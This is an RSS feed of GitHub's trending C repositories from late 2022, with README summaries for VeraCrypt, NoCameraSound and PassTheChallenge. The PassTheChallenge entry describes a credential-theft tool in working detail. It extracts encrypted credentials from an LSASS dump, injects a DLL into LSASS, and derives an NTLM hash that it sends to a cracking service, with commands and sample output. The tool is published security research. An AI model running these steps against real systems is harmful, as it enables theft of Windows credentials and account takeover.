<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-12-30T01:32:36Z</updated>
  <subtitle>Daily Trending of C in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>veracrypt/VeraCrypt</title>
    <updated>2022-12-30T01:32:36Z</updated>
    <id>tag:github.com,2022-12-30:/veracrypt/VeraCrypt</id>
    <link href="https://github.com/veracrypt/VeraCrypt" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Disk encryption with strong security based on TrueCrypt&lt;/p&gt;&lt;hr&gt;&lt;p&gt;This archive contains the source code of VeraCrypt. It is based on original TrueCrypt 7.1a with security enhancements and modifications.&lt;/p&gt; &#xA;&lt;h1&gt;Important&lt;/h1&gt; &#xA;&lt;p&gt;You may use the source code contained in this archive only if you accept and agree to the license terms contained in the file &#39;License.txt&#39;, which is included in this archive.&lt;/p&gt; &#xA;&lt;p&gt;Note that the license specifies, for example, that a derived work must not be called &#39;TrueCrypt&#39; or &#39;VeraCrypt&#39;&lt;/p&gt; &#xA;&lt;h1&gt;Contents&lt;/h1&gt; &#xA;&lt;p&gt;I. Windows Instructions for Signing and Packaging VeraCrypt for Windows.&lt;/p&gt; &#xA;&lt;p&gt;II. Linux and Mac OS X Requirements for Building VeraCrypt for Linux and Mac OS X. Instructions for Building VeraCrypt for Linux and Mac OS X. Mac OS X specifics&lt;/p&gt; &#xA;&lt;p&gt;III. FreeBSD&lt;/p&gt; &#xA;&lt;p&gt;IV. Third-Party Developers (Contributors)&lt;/p&gt; &#xA;&lt;p&gt;V. Legal Information&lt;/p&gt; &#xA;&lt;p&gt;VI. Further Information&lt;/p&gt; &#xA;&lt;h1&gt;I. Windows&lt;/h1&gt; &#xA;&lt;h2&gt;Requirements for Building VeraCrypt for Windows:&lt;/h2&gt; &#xA;&lt;p&gt;A detailed guide on how to build VeraCrypt on Windows can be found in the file doc/html/CompilingGuidelineWin.html. it is also available online at &lt;a href=&#34;https://www.veracrypt.fr/en/CompilingGuidelineWin.html&#34;&gt;https://www.veracrypt.fr/en/CompilingGuidelineWin.html&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;IMPORTANT:&lt;/p&gt; &#xA;&lt;p&gt;The 64-bit editions of Windows Vista and later versions of Windows, and in some cases (e.g. playback of HD DVD content) also the 32-bit editions, do not allow the VeraCrypt driver to run without an appropriate digital signature. Therefore, all .sys files in official VeraCrypt binary packages are digitally signed with the digital certificate of the IDRIX, which was issued by GlobalSign certification authority. At the end of each official .exe and .sys file, there are embedded digital signatures and all related certificates (i.e. all certificates in the relevant certification chain, such as the certification authority certificates, CA-MS cross-certificate, and the IDRIX certificate). Keep this in mind if you compile VeraCrypt and compare your binaries with the official binaries. If your binaries are unsigned, the sizes of the official binaries will usually be approximately 10 KiB greater than sizes of your binaries (there may be further differences if you use a different version of the compiler, or if you install a different or no service pack for Visual Studio, or different hotfixes for it, or if you use different versions of the required SDKs).&lt;/p&gt; &#xA;&lt;h2&gt;Instructions for Signing and Packaging VeraCrypt for Windows:&lt;/h2&gt; &#xA;&lt;p&gt;First, create an environment variable &#39;WSDK81&#39; pointing to the Windows SDK for Windows 8.1 installation directory. The folder &#34;Signing&#34; contains a batch file (sign.bat) that will sign all VeraCrypt components using a code signing certificate present on the certificate store and also build the final installation setup and MSI package. The batch file suppose that the code signing certificate is issued by GlobalSign. This is the case for IDRIX&#39;s certificate. If yours is issued by another CA, then you should put its intermediate certificates in the &#34;Signing&#34; folder and modify sign.bat accordingly.&lt;/p&gt; &#xA;&lt;p&gt;In order to generate MSI packages, WiX Toolset v3.11 must be installed.&lt;/p&gt; &#xA;&lt;h2&gt;VeraCrypt EFI Boot Loader:&lt;/h2&gt; &#xA;&lt;p&gt;VeraCrypt source code contains pre-built EFI binaries under src\Boot\EFI. The source code of VeraCrypt EFI Boot Loader is licensed under LGPL and it is available at &lt;a href=&#34;https://github.com/veracrypt/VeraCrypt-DCS&#34;&gt;https://github.com/veracrypt/VeraCrypt-DCS&lt;/a&gt;. For build instructions, please refer to the file src\Boot\EFI\Readme.txt.&lt;/p&gt; &#xA;&lt;h1&gt;II. Linux and Mac OS X&lt;/h1&gt; &#xA;&lt;p&gt;A detailed guide on how to build VeraCrypt on Linux can be found in the file doc/html/CompilingGuidelineLinux.html. it is also available online at &lt;a href=&#34;https://www.veracrypt.fr/en/CompilingGuidelineLinux.html&#34;&gt;https://www.veracrypt.fr/en/CompilingGuidelineLinux.html&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Requirements for Building VeraCrypt for Linux and Mac OS X:&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;GNU Make&lt;/li&gt; &#xA; &lt;li&gt;GNU C++ Compiler 4.0 or compatible&lt;/li&gt; &#xA; &lt;li&gt;Apple Xcode (Mac OS X only)&lt;/li&gt; &#xA; &lt;li&gt;YASM 1.3.0 or newer (Linux only, x86/x64 architecture only)&lt;/li&gt; &#xA; &lt;li&gt;pkg-config&lt;/li&gt; &#xA; &lt;li&gt;wxWidgets 3.0 shared library and header files installed or wxWidgets 3.0 library source code (available at &lt;a href=&#34;https://www.wxwidgets.org&#34;&gt;https://www.wxwidgets.org&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;FUSE library and header files (available at &lt;a href=&#34;https://github.com/libfuse/libfuse&#34;&gt;https://github.com/libfuse/libfuse&lt;/a&gt; and &lt;a href=&#34;https://osxfuse.github.io/&#34;&gt;https://osxfuse.github.io/&lt;/a&gt;)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Instructions for Building VeraCrypt for Linux and Mac OS X:&lt;/h2&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt; &lt;p&gt;Change the current directory to the root of the VeraCrypt source code.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;If you have no wxWidgets shared library installed, run the following command to configure the wxWidgets static library for VeraCrypt and to build it:&lt;/p&gt; &lt;pre&gt;&lt;code&gt;$ make WXSTATIC=1 WX_ROOT=/usr/src/wxWidgets wxbuild&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;The variable WX_ROOT must point to the location of the source code of the wxWidgets library. Output files will be placed in the &#39;./wxrelease/&#39; directory.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;To build VeraCrypt, run the following command:&lt;/p&gt; &lt;pre&gt;&lt;code&gt;$ make&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;or if you have no wxWidgets shared library installed:&lt;/p&gt; &lt;pre&gt;&lt;code&gt;$ make WXSTATIC=1&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;If successful, the VeraCrypt executable should be located in the directory &#39;Main&#39;.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;By default, a universal executable supporting both graphical and text user interface (through the switch --text) is built. On Linux, a console-only executable, which requires no GUI library, can be built using the &#39;NOGUI&#39; parameter:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ make NOGUI=1 WXSTATIC=1 WX_ROOT=/usr/src/wxWidgets wxbuild&#xA;$ make NOGUI=1 WXSTATIC=1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;On MacOSX, building a console-only executable is not supported.&lt;/p&gt; &#xA;&lt;h2&gt;Mac OS X specifics:&lt;/h2&gt; &#xA;&lt;p&gt;Under MacOSX, the SDK for OSX 11.3 is used by default. To use another version of the SDK (i.e. 10.15), you can export the environment variable VC_OSX_TARGET:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ export VC_OSX_TARGET=10.15&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Before building under MacOSX, pkg-config must be installed if not yet available. Get it from &lt;a href=&#34;https://pkgconfig.freedesktop.org/releases/pkg-config-0.28.tar.gz&#34;&gt;https://pkgconfig.freedesktop.org/releases/pkg-config-0.28.tar.gz&lt;/a&gt; and compile using the following commands :&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ ./configure --with-internal-glib&#xA;$ make&#xA;$ sudo make install&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;After making sure pkg-config is available, download and install OSXFuse from &lt;a href=&#34;https://osxfuse.github.io/&#34;&gt;https://osxfuse.github.io/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;The script build_veracrypt_macosx.sh available under &#34;src/Build&#34; performs the full build of VeraCrypt including the creation of the installer pkg. It expects to find the wxWidgets 3.1.2 sources at the same level as where you put VeraCrypt sources (i.e. if &#34;src&#34; path is &#34;/Users/joe/Projects/VeraCrypt/src&#34; then wxWidgets should be at &#34;/Users/joe/Projects/wxWidgets-3.1.2&#34;)&lt;/p&gt; &#xA;&lt;p&gt;The build process uses Code Signing certificates whose ID is specified in src/Main/Main.make (look for lines containing &#34;Developer ID Application&#34; and &#34;Developer ID Installer&#34;). You&#39;ll have to modify these lines to put the ID of your Code Signing certificates or comment them if you don&#39;t have one.&lt;/p&gt; &#xA;&lt;p&gt;Because of incompatibility issues with OSXFUSE, the SDK 10.9 generates a VeraCrypt binary that has issues communicating with the OSXFUSE kernel extension. Thus, we recommend using a different OSX SDK version for building VeraCrypt.&lt;/p&gt; &#xA;&lt;h1&gt;III. FreeBSD&lt;/h1&gt; &#xA;&lt;p&gt;FreeBSD is supported starting from version 11. The build requirements and instructions are the same as Linux except that gmake should be used instead of make.&lt;/p&gt; &#xA;&lt;h1&gt;IV. Third-Party Developers (Contributors)&lt;/h1&gt; &#xA;&lt;p&gt;If you intend to implement a feature, please contact us first to make sure:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;That the feature has not been implemented (we may have already implemented it, but haven&#39;t released the code yet).&lt;/li&gt; &#xA; &lt;li&gt;That the feature is acceptable.&lt;/li&gt; &#xA; &lt;li&gt;Whether we need help of third-party developers with implementing the feature.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;Information on how to contact us can be found at: &lt;a href=&#34;https://www.veracrypt.fr/&#34;&gt;https://www.veracrypt.fr/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h1&gt;V. Legal Information&lt;/h1&gt; &#xA;&lt;h2&gt;Copyright Information&lt;/h2&gt; &#xA;&lt;p&gt;This software as a whole:&lt;br&gt; Copyright (c) 2013-2022 IDRIX. All rights reserved.&lt;/p&gt; &#xA;&lt;p&gt;Portions of this software:&lt;br&gt; Copyright (c) 2013-2022 IDRIX. All rights reserved.&lt;br&gt; Copyright (c) 2003-2012 TrueCrypt Developers Association. All rights reserved.&lt;br&gt; Copyright (c) 1998-2000 Paul Le Roux. All rights reserved.&lt;br&gt; Copyright (c) 1998-2008 Brian Gladman, Worcester, UK. All rights reserved.&lt;br&gt; Copyright (c) 1995-2017 Jean-loup Gailly and Mark Adler.&lt;br&gt; Copyright (c) 2016 Disk Cryptography Services for EFI (DCS), Alex Kolotnikov&lt;br&gt; Copyright (c) 1999-2017 Dieter Baron and Thomas Klausner.&lt;br&gt; Copyright (c) 2013, Alexey Degtyarev. All rights reserved.&lt;br&gt; Copyright (c) 1999-2016 Jack Lloyd. All rights reserved.&lt;br&gt; Copyright (c) 2013-2019 Stephan Mueller &lt;a href=&#34;mailto:smueller@chronox.de&#34;&gt;smueller@chronox.de&lt;/a&gt; Copyright (c) 1999-2021 Igor Pavlov&lt;/p&gt; &#xA;&lt;p&gt;For more information, please see the legal notices attached to parts of the source code.&lt;/p&gt; &#xA;&lt;h2&gt;Trademark Information&lt;/h2&gt; &#xA;&lt;p&gt;Any trademarks contained in the source code, binaries, and/or in the documentation, are the sole property of their respective owners.&lt;/p&gt; &#xA;&lt;h1&gt;VI. Further Information&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.veracrypt.fr&#34;&gt;https://www.veracrypt.fr&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>ly4k/PassTheChallenge</title>
    <updated>2022-12-30T01:32:36Z</updated>
    <id>tag:github.com,2022-12-30:/ly4k/PassTheChallenge</id>
    <link href="https://github.com/ly4k/PassTheChallenge" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Recovering NTLM hashes from Credential Guard&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;PassTheChallenge&lt;/h1&gt; &#xA;&lt;p&gt;Recovering NTLM hashes from Credential Guard. Read more about the techniques &lt;a href=&#34;https://research.ifcr.dk/pass-the-challenge-defeating-credential-guard-31a892eee22&#34;&gt;here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;p&gt;Releases can be found &lt;a href=&#34;https://github.com/ly4k/PassTheChallenge/releases/tag/v1.0&#34;&gt;here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Pass-the-Challenge (PtC) - by Oliver Lyak (ly4k)&#xA;&#xA;Usage: &amp;lt;command&amp;gt; [&amp;lt;parameters...&amp;gt;]&#xA;&#xA;Commands:&#xA;    inject - Inject module and start PtC-RPC server inside LSASS&#xA;    ping - Ping the PtC-RPC server inside LSASS&#xA;    challenge - Calculate NTLMv2 Response using encrypted credentials&#xA;      &amp;lt;addresses&amp;gt; - &amp;lt;context handle&amp;gt;:&amp;lt;proxy info&amp;gt;&#xA;      &amp;lt;encrypted blob&amp;gt; - &amp;lt;HEX&amp;gt;&#xA;      &amp;lt;server challenge&amp;gt; - &amp;lt;UTF16_HEX domain&amp;gt;:&amp;lt;UTF16_HEX username&amp;gt;:&amp;lt;HEX server name&amp;gt;:&amp;lt;HEX server challenge&amp;gt;&#xA;    nthash - Calculate NTLMv1 Response using encrypted credentials&#xA;      &amp;lt;addresses&amp;gt; - &amp;lt;context handle&amp;gt;:&amp;lt;proxy info&amp;gt;&#xA;      &amp;lt;encrypted blob&amp;gt; - &amp;lt;HEX&amp;gt;&#xA;      [&amp;lt;server challenge&amp;gt;] - If omitted, a static challenge of 1122334455667788 will be used&#xA;    protect - Convert NT hash to encrypted blob&#xA;      &amp;lt;addresses&amp;gt; - &amp;lt;context handle&amp;gt;:&amp;lt;proxy info&amp;gt;&#xA;      &amp;lt;nt hash&amp;gt; - &amp;lt;HEX&amp;gt;&#xA;    compare - Compare two encrypted blobs or an encrypted blob with a NT hash&#xA;      &amp;lt;addresses&amp;gt; - &amp;lt;context handle&amp;gt;:&amp;lt;proxy info&amp;gt;&#xA;      &amp;lt;encrypted blob&amp;gt; - &amp;lt;HEX&amp;gt;&#xA;      &amp;lt;encrypted blob/NT hash&amp;gt; - &amp;lt;HEX&amp;gt;&#xA;&#xA;Examples:&#xA;    PtC.exe inject [&amp;lt;module&amp;gt;]&#xA;    PtC.exe ping&#xA;    PtC.exe challenge 0x1a34b[...]:0x7fff7[...] 0a92a82feb4[...] 6c0079[...]:610064[...]:020008[...]:66a98b[...]&#xA;    PtC.exe nthash 0x1a34b[...]:0x7fff7[...] 0a92a82feb4[...]&#xA;    PtC.exe protect 0x1a34b[...]:0x7fff7[...] 0a92a82feb4[...]&#xA;    PtC.exe compare 0x1a34b[...]:0x7fff7[...] 0a92a82feb4[...] 66a98b[...]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Examples&lt;/h3&gt; &#xA;&lt;p&gt;First, use the modified version of &lt;a href=&#34;https://github.com/ly4k/Pypykatz&#34;&gt;Pypykatz&lt;/a&gt; to extract the encrypted credentials, along with the &#34;Context Handle&#34; and &#34;Proxy Info&#34; from an LSASS memory dump.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;&amp;gt; python3 -m pypykatz lsa minidump lsass.DMP -p msv&#xA;[...]&#xA;luid 194748&#xA;        == MSV ==&#xA;                Username: Administrator&#xA;                Domain: corp&#xA;                        [LSA Isolated Data]&#xA;                        Is NT Present: True&#xA;                        Context Handle: 0x1b6d5216c60&#xA;                        Proxy Info: 0x7ffdd8bfd380&#xA;                        Encrypted blob: a0000000000000000800000064000000010000000101000001000000366f55058c45738be16ab11f1d78586f2649f0c348b3171496cd7ef39dd4f3bb3dfda4ea33fb46d407887a570b1d545d0100000000000000000000000000000001000000340000004e746c6d48617368256a784d729f032326c6f16b07ebbd279dab88912c12e9b7f8b16e3a5ccdce5f70b65eef248cf38faf856a9793cba54c7f8bf4ef&#xA;                DPAPI: c02c86e371103ad7d7d352b19af1a74a00000000&#xA;[...]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Then inject the &lt;a href=&#34;https://github.com/ly4k/PassTheChallenge/releases/tag/v1.0&#34;&gt;SecurityPackage.dll&lt;/a&gt; module into the LSASS process. Make sure that &lt;code&gt;SecurityPackage.dll&lt;/code&gt; is located in your current working directory, or specify an alternative path as the first parameter.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;&amp;gt; .\PassTheChallenge.exe inject &amp;lt;[path to module]&amp;gt;&#xA;Pass-the-Challenge (PtC) - by Oliver Lyak (ly4k)&#xA;&#xA;[+] Package seems to be loaded&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The easy way to retrieve the NTLM hash is by using the &lt;code&gt;nthash&lt;/code&gt; command, as shown below using the values from the Pypykatz dump.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;&amp;gt; .\PassTheChallenge.exe nthash 0x1b6d5216c60:0x7ffdd8bfd380 a0000000000000000800000064000000010000000101000001000000366f55058c45738be16ab11f1d78586f2649f0c348b3171496cd7ef39dd4f3bb3dfda4ea33fb46d407887a570b1d545d0100000000000000000000000000000001000000340000004e746c6d48617368256a784d729f032326c6f16b07ebbd279dab88912c12e9b7f8b16e3a5ccdce5f70b65eef248cf38faf856a9793cba54c7f8bf4ef&#xA;Pass-the-Challenge (PtC) - by Oliver Lyak (ly4k)&#xA;&#xA;[+] Server is alive&#xA;[+] Response:&#xA;&#xA;NTHASH:0F2FBBD336C44CB24E5189483F77378135F02C79D225B1AC&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Finally, submit the NTHASH for free to &lt;a href=&#34;https://crack.sh/get-cracking/&#34;&gt;crack.sh&lt;/a&gt; and wait around 30 seconds for your NTLM hash to be recovered.&lt;/p&gt; &#xA;&lt;p&gt;See the blog post for more &lt;a href=&#34;https://research.ifcr.dk/pass-the-challenge-defeating-credential-guard-31a892eee22&#34;&gt;details&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>straight-tamago/NoCameraSound</title>
    <updated>2022-12-30T01:32:36Z</updated>
    <id>tag:github.com,2022-12-30:/straight-tamago/NoCameraSound</id>
    <link href="https://github.com/straight-tamago/NoCameraSound" rel="alternate"></link>
    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;NoCameraSound&lt;/h1&gt; &#xA;&lt;p&gt;iOS 14 - 16.1.2&lt;/p&gt; &#xA;&lt;p&gt;Reboot your device to revert the changes. (iOS14❌)&lt;/p&gt; &#xA;&lt;p&gt;｢Auto run when the app starts (ON)｣ + ShortcutApp &lt;a href=&#34;https://media.discordapp.net/attachments/1014483356655833099/1057405088274055249/video_17370129658033-RmTGqIy9.mp4&#34;&gt;https://media.discordapp.net/attachments/1014483356655833099/1057405088274055249/video_17370129658033-RmTGqIy9.mp4&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Install&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;TrollStore&lt;/li&gt; &#xA; &lt;li&gt;AltStore&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;Credits&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/zhuowei&#34;&gt;https://github.com/zhuowei&lt;/a&gt; (MacDirtyCow exploit)&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://twitter.com/straight_tamago&#34;&gt;https://twitter.com/straight_tamago&lt;/a&gt; (NoCameraSound)&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
</feed>